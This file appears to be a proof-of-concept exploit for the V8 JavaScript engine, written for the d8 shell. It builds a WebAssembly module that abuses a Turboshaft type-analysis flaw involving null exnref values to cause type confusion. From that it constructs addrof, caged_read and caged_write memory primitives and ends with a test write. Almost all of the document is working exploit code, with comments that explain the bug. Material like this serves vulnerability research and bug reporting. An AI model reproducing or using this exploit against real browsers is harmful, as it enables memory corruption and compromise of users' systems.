// --turboshaft-wasm --experimental-wasm-exnref
d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');

let builder = new WasmModuleBuilder();

let $s0 = builder.addStruct([makeField(kWasmI32, true)]);
let $s1 = builder.addStruct([makeField(kWasmExternRef, true), makeField(kWasmI32, true)]);    // src type
let $s2 = builder.addStruct([makeField(kWasmI32, true), makeField(wasmRefType($s0), true)]);  // tgt type
let $sig_s2_s2 = builder.addType(makeSig([wasmRefType($s2)], [wasmRefType($s2)]));

let $sig_i_r = builder.addType(kSig_i_r);
let $sig_i_i = builder.addType(kSig_i_i);
let $sig_v_ii = builder.addType(kSig_v_ii);
let $sig_exnref_v = builder.addType(makeSig([], [wasmRefType(kWasmExnRef)]));

let $null_thrower = builder.addImport('import', 'null_thrower', kSig_v_v);
let $dummy_s1 = builder.addGlobal(wasmRefType($s1), true, false, [
  kGCPrefix, kExprStructNewDefault, $s1,
]).exportAs('dummy_s1');
let $dummy_s2 = builder.addGlobal(wasmRefType($s2), true, false, [
  ...wasmI32Const(0),
  kGCPrefix, kExprStructNewDefault, $s0,
  kGCPrefix, kExprStructNew, $s2,
]);

// can be non-nullable as per https://github.com/WebAssembly/exception-handling/issues/336, which shouldn't be?
let $get_nonnull = builder.addFunction('get_nonnull', $sig_exnref_v).addBody([
  kExprBlock, $sig_exnref_v,
    kExprTryTable, kWasmVoid, 1, kCatchAllRef, 0,
      kExprCallFunction, $null_thrower,
    kExprEnd,
    kExprUnreachable,
  kExprEnd,
]).exportFunc();

// "null value in non-null type" case
// => still exploitable via WasmTypeCheck (ref null ToNullSentinel(T)) + Branch
// mark as unreachable in typer via WasmGCTypeAnalyzer::ProcessBranchOnTarget() -> WasmGCTypeAnalyzer::RefineTypeKnowledge()
let typer_unreachable = [
  kExprLocalGet, 1, ...wasmI32Const(1), kExprI32Sub, kExprI32Eqz,
  kExprIf, kWasmVoid,
    kExprGlobalGet, $dummy_s2.index,
    kExprReturn,
  kExprEnd,
 
  kExprBlock, kWasmVoid,
    kExprCallFunction, $get_nonnull.index,        // decoder/typer: ref exnref
    kGCPrefix, kExprRefCastNull, kExnRefCode,     // decoder: ref null exnref, typer: ref exnref
    kGCPrefix, kExprRefTestNull, kNullExnRefCode, // test for ref null noexnref => test emitted, but true branch statically unreachable
    kExprBrIf, 0,                                 // taken on runtime
    kExprUnreachable,                             // false branch, not taken
  kExprEnd,                                       // true branch, taken (but statically unreachable)

  // following code reachable on runtime but unreachable on turboshaft typer opt analysis

  // - ref.test input type only "contextually invalid" when looking at
  //   branch taken block in WasmGCTypeAnalyzer::ProcessBranchOnTarget(),
  //   and is valid in the context of the operation itself (prior to
  //   branch taken analysis)
  //   => check is emitted w/o Unreachable()
  // - ref.test of (ref T) -> (ref null ToNullSentinel(T)) not reducible as
  //   neither T <: ToNullSentinel(T) nor T & ToNullSentinel(T) unrelated
  //   (for T != ToNullSentinel(T))
  //   => reduction into IsNull() -> Word32Constant(0) may mitigate this
];

let $confuser = builder.addFunction('confuser', makeSig([wasmRefType($s1), kWasmI32], [wasmRefType($s2)]))
  .addLocals(kWasmAnyRef, 1)
  .addLocals(kWasmI32, 1)
  .addBody([
    kExprGlobalGet, $dummy_s2.index,
    kExprLocalSet, 2,

    ...typer_unreachable,

    // https://source.chromium.org/chromium/chromium/src/+/main:v8/src/compiler/turboshaft/wasm-gc-typed-optimization-reducer.cc;l=23
    // not reprocessed due to typer unreachability analysis
    kExprLoop, kWasmVoid, // "unreachable" loop
      // not reprocessed - local.1 type analysis fails to acknowledge ref $s1
      kExprLoop, kWasmVoid,
        // typecast
        kExprLocalGet, 2,
        kGCPrefix, kExprRefCast, $s2,     // typed as ref $s2
        kExprLocalGet, 3, ...wasmI32Const(1), kExprI32Sub, kExprI32Eqz,
        kExprIf, $sig_s2_s2,              // local3 == 1 => actual type is ref $s1
          // type confusion: $s1 -> $s2
          kExprReturn,
        kExprEnd,
        kExprDrop,

        // dummy branch for loop phi
        // if (local0 == 0x42) continue;
        kExprLocalGet, 1, ...wasmI32Const(0x42), kExprI32Sub, kExprI32Eqz,
        kExprBrIf, 0,
      kExprEnd,

      // should have triggered loop phi recheck but nah, this whole thing is "unreachable"
      kExprLocalGet, 0,
      kExprLocalSet, 2,

      // local3++;
      kExprLocalGet, 3,
      kExprI32Const, 1,
      kExprI32Add,
      kExprLocalSet, 3,

      // if (--local1) continue;
      kExprLocalGet, 1,
      kExprI32Const, 1,
      kExprI32Sub,
      kExprLocalTee, 1,
      kExprBrIf, 0,
    kExprEnd,

    kExprGlobalGet, $dummy_s2.index,
  ]
).exportFunc();

builder.addFunction('addrof', $sig_i_r).addBody([
  kExprLocalGet, 0,
  ...wasmI32Const(0),
  kGCPrefix, kExprStructNew, $s1,
  ...wasmI32Const(0),
  kExprCallFunction, $confuser.index,
  kGCPrefix, kExprStructGet, $s2, 0,
]).exportFunc();

builder.addFunction('caged_read', $sig_i_i).addBody([
  kExprRefNull, kNullExternRefCode,
  kExprLocalGet, 0,
  ...wasmI32Const(7),
  kExprI32Sub,
  kGCPrefix, kExprStructNew, $s1,
  ...wasmI32Const(0),
  kExprCallFunction, $confuser.index,
  kGCPrefix, kExprStructGet, $s2, 1,
  kGCPrefix, kExprStructGet, $s0, 0,
]).exportFunc();

builder.addFunction('caged_write', $sig_v_ii).addBody([
  kExprRefNull, kNullExternRefCode,
  kExprLocalGet, 0,
  ...wasmI32Const(7),
  kExprI32Sub,
  kGCPrefix, kExprStructNew, $s1,
  ...wasmI32Const(0),
  kExprCallFunction, $confuser.index,
  kGCPrefix, kExprStructGet, $s2, 1,
  kExprLocalGet, 1,
  kGCPrefix, kExprStructSet, $s0, 0,
]).exportFunc();

let instance = builder.instantiate({import: {null_thrower: () => {throw null;}}});
let {dummy_s1, confuser, addrof, caged_read, caged_write} = instance.exports;

// turboshaft tier-up
for (let i = 0; i < 0x400000; i++) {
  confuser(dummy_s1.value, 1);
}

caged_write(0x42424242, 0x13371337);
